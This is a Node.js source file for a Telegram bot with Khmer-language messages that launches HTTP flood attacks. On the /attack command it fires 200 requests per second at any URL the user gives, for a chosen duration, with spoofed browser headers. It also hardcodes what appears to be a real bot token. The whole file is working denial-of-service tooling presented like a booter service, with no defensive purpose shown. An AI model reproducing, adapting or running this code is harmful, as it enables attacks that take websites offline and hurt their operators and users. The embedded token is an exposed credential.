const TelegramBot = require('node-telegram-bot-api');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const token = '7585519374:AAEX3WPHCVGy4msJ3sIoziHHHdggB6PQhVA';
const bot = new TelegramBot(token, { polling: true });

const defaultHeaders = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1'
};

let attackTimer = null;
const REQUESTS_PER_SECOND = 200;

function sendAttackRequest(targetUrl, headers) {
  return fetch(targetUrl, { headers })
    .then(res => res.status)
    .catch(() => { throw new Error('Request failed'); });
}

bot.onText(/\/attack(?:\s+(\S+))?(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetUrl = match[1];
  let duration = parseInt(match[2], 10);

  if (!targetUrl || !targetUrl.startsWith('http')) {
    bot.sendMessage(chatId, 'សូមប្រើបញ្ជា:\n/attack [url] [រយៈពេលវិនាទី]\nឧទាហរណ៍: /attack https://example.com 120');
    return;
  }
  if (isNaN(duration) || duration < 1) duration = 120;

  if (attackTimer) {
    clearInterval(attackTimer);
    attackTimer = null;
  }

  let remaining = duration;

  // បង្ហាញសារចាប់ផ្តើម
  const now = new Date();
  const timeStr = now.toLocaleTimeString('en-GB', { hour12: false });
  const dateStr = `${now.getDate()}/${now.getMonth() + 1}/${now.getFullYear()}`;
  const attackMsg = `✅ 𝑨𝒕𝒕𝒂𝒄𝒌 Start attacking.
🌐 ម្ចាស់ផ្ទះ៖ ${targetUrl}
🔌 ច្រក: 443
🛠️ វិធីសាស្រ្ត៖ ទឹកជំនន់
🖥️ ម៉ាស៊ីនមេ៖ 1/2
🔁 ស្របគ្នាដោយឥតគិតថ្លៃ៖ 1/2
🔁 វីអាយភីស្របគ្នា៖ ០/៤
🔁 SieuVIP ស្របគ្នា៖ 0/3
🏆អ្នកប្រើប្រាស់៖ ឥតគិតថ្លៃ
⏰ ពេលវេលា៖ ${duration}/${duration} ✅

🔐 ត្រាងថីប៖ បើក
🔐 របៀបbot: អនុញ្ញាត
🕒 រយៈពេល: ${timeStr} ${dateStr}`;

  await bot.sendMessage(chatId, attackMsg);

  // បញ្ជូនសារចាប់ផ្តើម countdown មួយដង
  let countdownMsg = await bot.sendMessage(chatId, `⏰ ពេលវេលា៖ ${remaining}/${duration} ✅`);

  attackTimer = setInterval(() => {
    if (remaining <= 0) {
      clearInterval(attackTimer);
      attackTimer = null;
      bot.editMessageText('🛑 Bot បានបញ្ចប់វាយប្រហារ។', {
        chat_id: chatId,
        message_id: countdownMsg.message_id
      });
      return;
    }

    // កែសម្រួលសារចាស់ (editMessageText) តែប៉ុណ្ណោះ
    bot.editMessageText(`⏰ ពេលវេលា៖ ${remaining}/${duration} ✅`, {
      chat_id: chatId,
      message_id: countdownMsg.message_id
    }).catch(() => {});

    // ផ្ញើ request attack
    for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
      sendAttackRequest(targetUrl, defaultHeaders).catch(() => {});
    }

    remaining--;
  }, 1000);
});

bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  if (attackTimer) {
    clearInterval(attackTimer);
    attackTimer = null;
    bot.sendMessage(chatId, '🛑 Bot បានឈប់វាយប្រហារ។');
  } else {
    bot.sendMessage(chatId, '🤖 មិនមានការវាយប្រហារកំពុងដំណើរការទេ។');
  }
});

bot.onText(/\/(start|help)/, (msg) => {
  bot.sendMessage(msg.chat.id, 'សូមប្រើបញ្ជា:\n/attack [url] [រយៈពេលវិនាទី]\nឧទាហរណ៍: /attack https://example.com 120');
});
